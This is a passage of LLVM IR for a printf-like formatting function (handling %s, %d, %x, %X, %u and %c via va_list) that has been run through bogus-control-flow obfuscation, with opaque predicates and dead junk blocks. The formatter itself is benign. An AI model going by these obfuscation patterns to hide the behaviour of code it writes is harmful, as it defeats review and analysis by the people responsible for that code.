  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8**, align 8
  %13 = alloca i8*, align 8
  %14 = alloca %struct.__va_list_tag*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca [2 x i8], align 1
  %19 = alloca i8*, align 8
  store i8** %0, i8*** %12, align 8
  store i8* %1, i8** %13, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %14, align 8
  store i32 0, i32* %17, align 4
  %20 = load i32, i32* @x.29
  %21 = load i32, i32* @y.30
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %28

; <label>:28:                                     ; preds = %491, %originalBBpart2
  %29 = load i8*, i8** %13, align 8
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i32
  %32 = icmp ne i32 %31, 0
  br i1 %32, label %33, label %494

; <label>:33:                                     ; preds = %28
  %34 = load i8*, i8** %13, align 8
  %35 = load i8, i8* %34, align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 37
  br i1 %37, label %38, label %482

; <label>:38:                                     ; preds = %33
  %39 = load i8*, i8** %13, align 8
  %40 = getelementptr inbounds i8, i8* %39, i32 1
  store i8* %40, i8** %13, align 8
  store i32 0, i32* %16, align 4
  store i32 0, i32* %15, align 4
  %41 = load i8*, i8** %13, align 8
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 %43, 0
  br i1 %44, label %45, label %62

; <label>:45:                                     ; preds = %38
  %46 = load i32, i32* @x.29
  %47 = load i32, i32* @y.30
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %45
  %54 = load i32, i32* @x.29
  %55 = load i32, i32* @y.30
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %494

; <label>:62:                                     ; preds = %38
  %63 = load i8*, i8** %13, align 8
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp eq i32 %65, 37
  br i1 %66, label %67, label %68

; <label>:67:                                     ; preds = %62
  br label %483

; <label>:68:                                     ; preds = %62
  %69 = load i32, i32* @x.29
  %70 = load i32, i32* @y.30
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %68
  %77 = load i8*, i8** %13, align 8
  %78 = load i8, i8* %77, align 1
  %79 = zext i8 %78 to i32
  %80 = icmp eq i32 %79, 45
  %81 = load i32, i32* @x.29
  %82 = load i32, i32* @y.30
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %80, label %89, label %92

; <label>:89:                                     ; preds = %originalBBpart28
  %90 = load i8*, i8** %13, align 8
  %91 = getelementptr inbounds i8, i8* %90, i32 1
  store i8* %91, i8** %13, align 8
  store i32 1, i32* %16, align 4
  br label %92

; <label>:92:                                     ; preds = %89, %originalBBpart28
  br label %93

; <label>:93:                                     ; preds = %originalBBpart212, %92
  %94 = load i8*, i8** %13, align 8
  %95 = load i8, i8* %94, align 1
  %96 = zext i8 %95 to i32
  %97 = icmp eq i32 %96, 48
  br i1 %97, label %98, label %119

; <label>:98:                                     ; preds = %93
  %99 = load i32, i32* @x.29
  %100 = load i32, i32* @y.30
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %98
  %107 = load i8*, i8** %13, align 8
  %108 = getelementptr inbounds i8, i8* %107, i32 1
  store i8* %108, i8** %13, align 8
  %109 = load i32, i32* %16, align 4
  %110 = or i32 %109, 2
  store i32 %110, i32* %16, align 4
  %111 = load i32, i32* @x.29
  %112 = load i32, i32* @y.30
  %113 = sub i32 %111, 1
  %114 = mul i32 %111, %113
  %115 = urem i32 %114, 2
  %116 = icmp eq i32 %115, 0
  %117 = icmp slt i32 %112, 10
  %118 = or i1 %116, %117
  br i1 %118, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %93

; <label>:119:                                    ; preds = %93
  %120 = load i32, i32* @x.29
  %121 = load i32, i32* @y.30
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %119
  %128 = load i32, i32* @x.29
  %129 = load i32, i32* @y.30
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %136

; <label>:136:                                    ; preds = %157, %originalBBpart216
  %137 = load i8*, i8** %13, align 8
  %138 = load i8, i8* %137, align 1
  %139 = zext i8 %138 to i32
  %140 = icmp sge i32 %139, 48
  br i1 %140, label %141, label %146

; <label>:141:                                    ; preds = %136
  %142 = load i8*, i8** %13, align 8
  %143 = load i8, i8* %142, align 1
  %144 = zext i8 %143 to i32
  %145 = icmp sle i32 %144, 57
  br label %146

; <label>:146:                                    ; preds = %141, %136
  %147 = phi i1 [ false, %136 ], [ %145, %141 ]
  br i1 %147, label %148, label %160

; <label>:148:                                    ; preds = %146
  %149 = load i32, i32* %15, align 4
  %150 = mul nsw i32 %149, 10
  store i32 %150, i32* %15, align 4
  %151 = load i8*, i8** %13, align 8
  %152 = load i8, i8* %151, align 1
  %153 = zext i8 %152 to i32
  %154 = sub nsw i32 %153, 48
  %155 = load i32, i32* %15, align 4
  %156 = add nsw i32 %155, %154
  store i32 %156, i32* %15, align 4
  br label %157

; <label>:157:                                    ; preds = %148
  %158 = load i8*, i8** %13, align 8
  %159 = getelementptr inbounds i8, i8* %158, i32 1
  store i8* %159, i8** %13, align 8
  br label %136

; <label>:160:                                    ; preds = %146
  %161 = load i8*, i8** %13, align 8
  %162 = load i8, i8* %161, align 1
  %163 = zext i8 %162 to i32
  %164 = icmp eq i32 %163, 115
  br i1 %164, label %165, label %215

; <label>:165:                                    ; preds = %160
  %166 = load i32, i32* @x.29
  %167 = load i32, i32* @y.30
  %168 = sub i32 %166, 1
  %169 = mul i32 %166, %168
  %170 = urem i32 %169, 2
  %171 = icmp eq i32 %170, 0
  %172 = icmp slt i32 %167, 10
  %173 = or i1 %171, %172
  br i1 %173, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %165
  %174 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %175 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %174, i32 0, i32 0
  %176 = load i32, i32* %175, align 8
  %177 = icmp ule i32 %176, 40
  %178 = load i32, i32* @x.29
  %179 = load i32, i32* @y.30
  %180 = sub i32 %178, 1
  %181 = mul i32 %178, %180
  %182 = urem i32 %181, 2
  %183 = icmp eq i32 %182, 0
  %184 = icmp slt i32 %179, 10
  %185 = or i1 %183, %184
  br i1 %185, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %177, label %186, label %192

; <label>:186:                                    ; preds = %originalBBpart220
  %187 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %174, i32 0, i32 3
  %188 = load i8*, i8** %187, align 8
  %189 = getelementptr i8, i8* %188, i32 %176
  %190 = bitcast i8* %189 to i32*
  %191 = add i32 %176, 8
  store i32 %191, i32* %175, align 8
  br label %197

; <label>:192:                                    ; preds = %originalBBpart220
  %193 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %174, i32 0, i32 2
  %194 = load i8*, i8** %193, align 8
  %195 = bitcast i8* %194 to i32*
  %196 = getelementptr i8, i8* %194, i32 8
  store i8* %196, i8** %193, align 8
  br label %197

; <label>:197:                                    ; preds = %192, %186
  %198 = phi i32* [ %190, %186 ], [ %195, %192 ]
  %199 = load i32, i32* %198, align 4
  %200 = sext i32 %199 to i64
  %201 = inttoptr i64 %200 to i8*
  store i8* %201, i8** %19, align 8
  %202 = load i8**, i8*** %12, align 8
  %203 = load i8*, i8** %19, align 8
  %204 = icmp ne i8* %203, null
  br i1 %204, label %205, label %207

; <label>:205:                                    ; preds = %197
  %206 = load i8*, i8** %19, align 8
  br label %208

; <label>:207:                                    ; preds = %197
  br label %208

; <label>:208:                                    ; preds = %207, %205
  %209 = phi i8* [ %206, %205 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.538, i32 0, i32 0), %207 ]
  %210 = load i32, i32* %15, align 4
  %211 = load i32, i32* %16, align 4
  %212 = call i32 @prints(i8** %202, i8* %209, i32 %210, i32 %211)
  %213 = load i32, i32* %17, align 4
  %214 = add nsw i32 %213, %212
  store i32 %214, i32* %17, align 4
  br label %491

; <label>:215:                                    ; preds = %160
  %216 = load i8*, i8** %13, align 8
  %217 = load i8, i8* %216, align 1
  %218 = zext i8 %217 to i32
  %219 = icmp eq i32 %218, 100
  br i1 %219, label %220, label %245

; <label>:220:                                    ; preds = %215
  %221 = load i8**, i8*** %12, align 8
  %222 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %223 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %222, i32 0, i32 0
  %224 = load i32, i32* %223, align 8
  %225 = icmp ule i32 %224, 40
  br i1 %225, label %226, label %232

; <label>:226:                                    ; preds = %220
  %227 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %222, i32 0, i32 3
  %228 = load i8*, i8** %227, align 8
  %229 = getelementptr i8, i8* %228, i32 %224
  %230 = bitcast i8* %229 to i32*
  %231 = add i32 %224, 8
  store i32 %231, i32* %223, align 8
  br label %237

; <label>:232:                                    ; preds = %220
  %233 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %222, i32 0, i32 2
  %234 = load i8*, i8** %233, align 8
  %235 = bitcast i8* %234 to i32*
  %236 = getelementptr i8, i8* %234, i32 8
  store i8* %236, i8** %233, align 8
  br label %237

; <label>:237:                                    ; preds = %232, %226
  %238 = phi i32* [ %230, %226 ], [ %235, %232 ]
  %239 = load i32, i32* %238, align 4
  %240 = load i32, i32* %15, align 4
  %241 = load i32, i32* %16, align 4
  %242 = call i32 @printi(i8** %221, i32 %239, i32 10, i32 1, i32 %240, i32 %241, i32 97)
  %243 = load i32, i32* %17, align 4
  %244 = add nsw i32 %243, %242
  store i32 %244, i32* %17, align 4
  br label %491

; <label>:245:                                    ; preds = %215
  %246 = load i8*, i8** %13, align 8
  %247 = load i8, i8* %246, align 1
  %248 = zext i8 %247 to i32
  %249 = icmp eq i32 %248, 120
  br i1 %249, label %250, label %307

; <label>:250:                                    ; preds = %245
  %251 = load i32, i32* @x.29
  %252 = load i32, i32* @y.30
  %253 = sub i32 %251, 1
  %254 = mul i32 %251, %253
  %255 = urem i32 %254, 2
  %256 = icmp eq i32 %255, 0
  %257 = icmp slt i32 %252, 10
  %258 = or i1 %256, %257
  br i1 %258, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %250
  %259 = load i8**, i8*** %12, align 8
  %260 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %261 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %260, i32 0, i32 0
  %262 = load i32, i32* %261, align 8
  %263 = icmp ule i32 %262, 40
  %264 = load i32, i32* @x.29
  %265 = load i32, i32* @y.30
  %266 = sub i32 %264, 1
  %267 = mul i32 %264, %266
  %268 = urem i32 %267, 2
  %269 = icmp eq i32 %268, 0
  %270 = icmp slt i32 %265, 10
  %271 = or i1 %269, %270
  br i1 %271, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %263, label %272, label %278

; <label>:272:                                    ; preds = %originalBBpart224
  %273 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %260, i32 0, i32 3
  %274 = load i8*, i8** %273, align 8
  %275 = getelementptr i8, i8* %274, i32 %262
  %276 = bitcast i8* %275 to i32*
  %277 = add i32 %262, 8
  store i32 %277, i32* %261, align 8
  br label %283

; <label>:278:                                    ; preds = %originalBBpart224
  %279 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %260, i32 0, i32 2
  %280 = load i8*, i8** %279, align 8
  %281 = bitcast i8* %280 to i32*
  %282 = getelementptr i8, i8* %280, i32 8
  store i8* %282, i8** %279, align 8
  br label %283

; <label>:283:                                    ; preds = %278, %272
  %284 = phi i32* [ %276, %272 ], [ %281, %278 ]
  %285 = load i32, i32* @x.29
  %286 = load i32, i32* @y.30
  %287 = sub i32 %285, 1
  %288 = mul i32 %285, %287
  %289 = urem i32 %288, 2
  %290 = icmp eq i32 %289, 0
  %291 = icmp slt i32 %286, 10
  %292 = or i1 %290, %291
  br i1 %292, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %283
  %293 = load i32, i32* %284, align 4
  %294 = load i32, i32* %15, align 4
  %295 = load i32, i32* %16, align 4
  %296 = call i32 @printi(i8** %259, i32 %293, i32 16, i32 0, i32 %294, i32 %295, i32 97)
  %297 = load i32, i32* %17, align 4
  %298 = add nsw i32 %297, %296
  store i32 %298, i32* %17, align 4
  %299 = load i32, i32* @x.29
  %300 = load i32, i32* @y.30
  %301 = sub i32 %299, 1
  %302 = mul i32 %299, %301
  %303 = urem i32 %302, 2
  %304 = icmp eq i32 %303, 0
  %305 = icmp slt i32 %300, 10
  %306 = or i1 %304, %305
  br i1 %306, label %originalBBpart239, label %originalBB26alteredBB

originalBBpart239:                                ; preds = %originalBB26
  br label %491

; <label>:307:                                    ; preds = %245
  %308 = load i8*, i8** %13, align 8
  %309 = load i8, i8* %308, align 1
  %310 = zext i8 %309 to i32
  %311 = icmp eq i32 %310, 88
  br i1 %311, label %312, label %369

; <label>:312:                                    ; preds = %307
  %313 = load i8**, i8*** %12, align 8
  %314 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %315 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %314, i32 0, i32 0
  %316 = load i32, i32* %315, align 8
  %317 = icmp ule i32 %316, 40
  br i1 %317, label %318, label %340

; <label>:318:                                    ; preds = %312
  %319 = load i32, i32* @x.29
  %320 = load i32, i32* @y.30
  %321 = sub i32 %319, 1
  %322 = mul i32 %319, %321
  %323 = urem i32 %322, 2
  %324 = icmp eq i32 %323, 0
  %325 = icmp slt i32 %320, 10
  %326 = or i1 %324, %325
  br i1 %326, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %318
  %327 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %314, i32 0, i32 3
  %328 = load i8*, i8** %327, align 8
  %329 = getelementptr i8, i8* %328, i32 %316
  %330 = bitcast i8* %329 to i32*
  %331 = add i32 %316, 8
  store i32 %331, i32* %315, align 8
  %332 = load i32, i32* @x.29
  %333 = load i32, i32* @y.30
  %334 = sub i32 %332, 1
  %335 = mul i32 %332, %334
  %336 = urem i32 %335, 2
  %337 = icmp eq i32 %336, 0
  %338 = icmp slt i32 %333, 10
  %339 = or i1 %337, %338
  br i1 %339, label %originalBBpart250, label %originalBB41alteredBB

originalBBpart250:                                ; preds = %originalBB41
  br label %361

; <label>:340:                                    ; preds = %312
  %341 = load i32, i32* @x.29
  %342 = load i32, i32* @y.30
  %343 = sub i32 %341, 1
  %344 = mul i32 %341, %343
  %345 = urem i32 %344, 2
  %346 = icmp eq i32 %345, 0
  %347 = icmp slt i32 %342, 10
  %348 = or i1 %346, %347
  br i1 %348, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %340
  %349 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %314, i32 0, i32 2
  %350 = load i8*, i8** %349, align 8
  %351 = bitcast i8* %350 to i32*
  %352 = getelementptr i8, i8* %350, i32 8
  store i8* %352, i8** %349, align 8
  %353 = load i32, i32* @x.29
  %354 = load i32, i32* @y.30
  %355 = sub i32 %353, 1
  %356 = mul i32 %353, %355
  %357 = urem i32 %356, 2
  %358 = icmp eq i32 %357, 0
  %359 = icmp slt i32 %354, 10
  %360 = or i1 %358, %359
  br i1 %360, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  br label %361

; <label>:361:                                    ; preds = %originalBBpart254, %originalBBpart250
  %362 = phi i32* [ %330, %originalBBpart250 ], [ %351, %originalBBpart254 ]
  %363 = load i32, i32* %362, align 4
  %364 = load i32, i32* %15, align 4
  %365 = load i32, i32* %16, align 4
  %366 = call i32 @printi(i8** %313, i32 %363, i32 16, i32 0, i32 %364, i32 %365, i32 65)
  %367 = load i32, i32* %17, align 4
  %368 = add nsw i32 %367, %366
  store i32 %368, i32* %17, align 4
  br label %491

; <label>:369:                                    ; preds = %307
  %370 = load i32, i32* @x.29
  %371 = load i32, i32* @y.30
  %372 = sub i32 %370, 1
  %373 = mul i32 %370, %372
  %374 = urem i32 %373, 2
  %375 = icmp eq i32 %374, 0
  %376 = icmp slt i32 %371, 10
  %377 = or i1 %375, %376
  br i1 %377, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %369
  %378 = load i8*, i8** %13, align 8
  %379 = load i8, i8* %378, align 1
  %380 = zext i8 %379 to i32
  %381 = icmp eq i32 %380, 117
  %382 = load i32, i32* @x.29
  %383 = load i32, i32* @y.30
  %384 = sub i32 %382, 1
  %385 = mul i32 %382, %384
  %386 = urem i32 %385, 2
  %387 = icmp eq i32 %386, 0
  %388 = icmp slt i32 %383, 10
  %389 = or i1 %387, %388
  br i1 %389, label %originalBBpart258, label %originalBB56alteredBB

originalBBpart258:                                ; preds = %originalBB56
  br i1 %381, label %390, label %431

; <label>:390:                                    ; preds = %originalBBpart258
  %391 = load i8**, i8*** %12, align 8
  %392 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %393 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %392, i32 0, i32 0
  %394 = load i32, i32* %393, align 8
  %395 = icmp ule i32 %394, 40
  br i1 %395, label %396, label %402

; <label>:396:                                    ; preds = %390
  %397 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %392, i32 0, i32 3
  %398 = load i8*, i8** %397, align 8
  %399 = getelementptr i8, i8* %398, i32 %394
  %400 = bitcast i8* %399 to i32*
  %401 = add i32 %394, 8
  store i32 %401, i32* %393, align 8
  br label %407

; <label>:402:                                    ; preds = %390
  %403 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %392, i32 0, i32 2
  %404 = load i8*, i8** %403, align 8
  %405 = bitcast i8* %404 to i32*
  %406 = getelementptr i8, i8* %404, i32 8
  store i8* %406, i8** %403, align 8
  br label %407

; <label>:407:                                    ; preds = %402, %396
  %408 = phi i32* [ %400, %396 ], [ %405, %402 ]
  %409 = load i32, i32* @x.29
  %410 = load i32, i32* @y.30
  %411 = sub i32 %409, 1
  %412 = mul i32 %409, %411
  %413 = urem i32 %412, 2
  %414 = icmp eq i32 %413, 0
  %415 = icmp slt i32 %410, 10
  %416 = or i1 %414, %415
  br i1 %416, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %407
  %417 = load i32, i32* %408, align 4
  %418 = load i32, i32* %15, align 4
  %419 = load i32, i32* %16, align 4
  %420 = call i32 @printi(i8** %391, i32 %417, i32 10, i32 0, i32 %418, i32 %419, i32 97)
  %421 = load i32, i32* %17, align 4
  %422 = add nsw i32 %421, %420
  store i32 %422, i32* %17, align 4
  %423 = load i32, i32* @x.29
  %424 = load i32, i32* @y.30
  %425 = sub i32 %423, 1
  %426 = mul i32 %423, %425
  %427 = urem i32 %426, 2
  %428 = icmp eq i32 %427, 0
  %429 = icmp slt i32 %424, 10
  %430 = or i1 %428, %429
  br i1 %430, label %originalBBpart271, label %originalBB60alteredBB

originalBBpart271:                                ; preds = %originalBB60
  br label %491

; <label>:431:                                    ; preds = %originalBBpart258
  %432 = load i8*, i8** %13, align 8
  %433 = load i8, i8* %432, align 1
  %434 = zext i8 %433 to i32
  %435 = icmp eq i32 %434, 99
  br i1 %435, label %436, label %481

; <label>:436:                                    ; preds = %431
  %437 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %438 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %437, i32 0, i32 0
  %439 = load i32, i32* %438, align 8
  %440 = icmp ule i32 %439, 40
  br i1 %440, label %441, label %463

; <label>:441:                                    ; preds = %436
  %442 = load i32, i32* @x.29
  %443 = load i32, i32* @y.30
  %444 = sub i32 %442, 1
  %445 = mul i32 %442, %444
  %446 = urem i32 %445, 2
  %447 = icmp eq i32 %446, 0
  %448 = icmp slt i32 %443, 10
  %449 = or i1 %447, %448
  br i1 %449, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %441
  %450 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %437, i32 0, i32 3
  %451 = load i8*, i8** %450, align 8
  %452 = getelementptr i8, i8* %451, i32 %439
  %453 = bitcast i8* %452 to i32*
  %454 = add i32 %439, 8
  store i32 %454, i32* %438, align 8
  %455 = load i32, i32* @x.29
  %456 = load i32, i32* @y.30
  %457 = sub i32 %455, 1
  %458 = mul i32 %455, %457
  %459 = urem i32 %458, 2
  %460 = icmp eq i32 %459, 0
  %461 = icmp slt i32 %456, 10
  %462 = or i1 %460, %461
  br i1 %462, label %originalBBpart277, label %originalBB73alteredBB

originalBBpart277:                                ; preds = %originalBB73
  br label %468

; <label>:463:                                    ; preds = %436
  %464 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %437, i32 0, i32 2
  %465 = load i8*, i8** %464, align 8
  %466 = bitcast i8* %465 to i32*
  %467 = getelementptr i8, i8* %465, i32 8
  store i8* %467, i8** %464, align 8
  br label %468

; <label>:468:                                    ; preds = %463, %originalBBpart277
  %469 = phi i32* [ %453, %originalBBpart277 ], [ %466, %463 ]
  %470 = load i32, i32* %469, align 4
  %471 = trunc i32 %470 to i8
  %472 = getelementptr inbounds [2 x i8], [2 x i8]* %18, i64 0, i64 0
  store i8 %471, i8* %472, align 1
  %473 = getelementptr inbounds [2 x i8], [2 x i8]* %18, i64 0, i64 1
  store i8 0, i8* %473, align 1
  %474 = load i8**, i8*** %12, align 8
  %475 = getelementptr inbounds [2 x i8], [2 x i8]* %18, i32 0, i32 0
  %476 = load i32, i32* %15, align 4
  %477 = load i32, i32* %16, align 4
  %478 = call i32 @prints(i8** %474, i8* %475, i32 %476, i32 %477)
  %479 = load i32, i32* %17, align 4
  %480 = add nsw i32 %479, %478
  store i32 %480, i32* %17, align 4
  br label %491

; <label>:481:                                    ; preds = %431
  br label %490

; <label>:482:                                    ; preds = %33
  br label %483

; <label>:483:                                    ; preds = %482, %67
  %484 = load i8**, i8*** %12, align 8
  %485 = load i8*, i8** %13, align 8
  %486 = load i8, i8* %485, align 1
  %487 = zext i8 %486 to i32
  call void @printchar(i8** %484, i32 %487)
  %488 = load i32, i32* %17, align 4
  %489 = add nsw i32 %488, 1
  store i32 %489, i32* %17, align 4
  br label %490

; <label>:490:                                    ; preds = %483, %481
  br label %491

; <label>:491:                                    ; preds = %490, %468, %originalBBpart271, %361, %originalBBpart239, %237, %208
  %492 = load i8*, i8** %13, align 8
  %493 = getelementptr inbounds i8, i8* %492, i32 1
  store i8* %493, i8** %13, align 8
  br label %28

; <label>:494:                                    ; preds = %originalBBpart24, %28
  %495 = load i8**, i8*** %12, align 8
  %496 = icmp ne i8** %495, null
  br i1 %496, label %497, label %516

; <label>:497:                                    ; preds = %494
  %498 = load i32, i32* @x.29
  %499 = load i32, i32* @y.30
  %500 = sub i32 %498, 1
  %501 = mul i32 %498, %500
  %502 = urem i32 %501, 2
  %503 = icmp eq i32 %502, 0
  %504 = icmp slt i32 %499, 10
  %505 = or i1 %503, %504
  br i1 %505, label %originalBB79, label %originalBB79alteredBB

originalBB79:                                     ; preds = %originalBB79alteredBB, %497
  %506 = load i8**, i8*** %12, align 8
  %507 = load i8*, i8** %506, align 8
  store i8 0, i8* %507, align 1
  %508 = load i32, i32* @x.29
  %509 = load i32, i32* @y.30
  %510 = sub i32 %508, 1
  %511 = mul i32 %508, %510
  %512 = urem i32 %511, 2
  %513 = icmp eq i32 %512, 0
  %514 = icmp slt i32 %509, 10
  %515 = or i1 %513, %514
  br i1 %515, label %originalBBpart281, label %originalBB79alteredBB

originalBBpart281:                                ; preds = %originalBB79
  br label %516

; <label>:516:                                    ; preds = %originalBBpart281, %494
  %517 = load i32, i32* @x.29
  %518 = load i32, i32* @y.30
  %519 = sub i32 %517, 1
  %520 = mul i32 %517, %519
  %521 = urem i32 %520, 2
  %522 = icmp eq i32 %521, 0
  %523 = icmp slt i32 %518, 10
  %524 = or i1 %522, %523
  br i1 %524, label %originalBB83, label %originalBB83alteredBB

originalBB83:                                     ; preds = %originalBB83alteredBB, %516
  %525 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %526 = bitcast %struct.__va_list_tag* %525 to i8*
  call void @llvm.va_end(i8* %526)
  %527 = load i32, i32* %17, align 4
  %528 = load i32, i32* @x.29
  %529 = load i32, i32* @y.30
  %530 = sub i32 %528, 1
  %531 = mul i32 %528, %530
  %532 = urem i32 %531, 2
  %533 = icmp eq i32 %532, 0
  %534 = icmp slt i32 %529, 10
  %535 = or i1 %533, %534
  br i1 %535, label %originalBBpart285, label %originalBB83alteredBB

originalBBpart285:                                ; preds = %originalBB83
  ret i32 %527

originalBBalteredBB:                              ; preds = %originalBB, %3
  %536 = alloca i8**, align 8
  %537 = alloca i8*, align 8
  %538 = alloca %struct.__va_list_tag*, align 8
  %539 = alloca i32, align 4
  %540 = alloca i32, align 4
  %541 = alloca i32, align 4
  %542 = alloca [2 x i8], align 1
  %543 = alloca i8*, align 8
  store i8** %0, i8*** %536, align 8
  store i8* %1, i8** %537, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %538, align 8
  store i32 0, i32* %541, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %45
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %68
  %544 = load i8*, i8** %13, align 8
  %545 = load i8, i8* %544, align 1
  %546 = zext i8 %545 to i32
  %547 = icmp eq i32 %546, 45
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %98
  %548 = load i8*, i8** %13, align 8
  %549 = getelementptr inbounds i8, i8* %548, i32 1
  store i8* %549, i8** %13, align 8
  %550 = load i32, i32* %16, align 4
  %_ = shl i32 %550, 2
  %551 = or i32 %550, 2
  store i32 %551, i32* %16, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %119
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %165
  %552 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %553 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %552, i32 0, i32 0
  %554 = load i32, i32* %553, align 8
  %555 = icmp ule i32 %554, 40
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %250
  %556 = load i8**, i8*** %12, align 8
  %557 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %558 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %557, i32 0, i32 0
  %559 = load i32, i32* %558, align 8
  %560 = icmp ule i32 %559, 40
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %283
  %561 = load i32, i32* %284, align 4
  %562 = load i32, i32* %15, align 4
  %563 = load i32, i32* %16, align 4
  %564 = call i32 @printi(i8** %259, i32 %561, i32 16, i32 0, i32 %562, i32 %563, i32 97)
  %565 = load i32, i32* %17, align 4
  %_27 = sub i32 %565, %564
  %gen = mul i32 %_27, %564
  %_28 = sub i32 0, %565
  %gen29 = add i32 %_28, %564
  %_30 = sub i32 %565, %564
  %gen31 = mul i32 %_30, %564
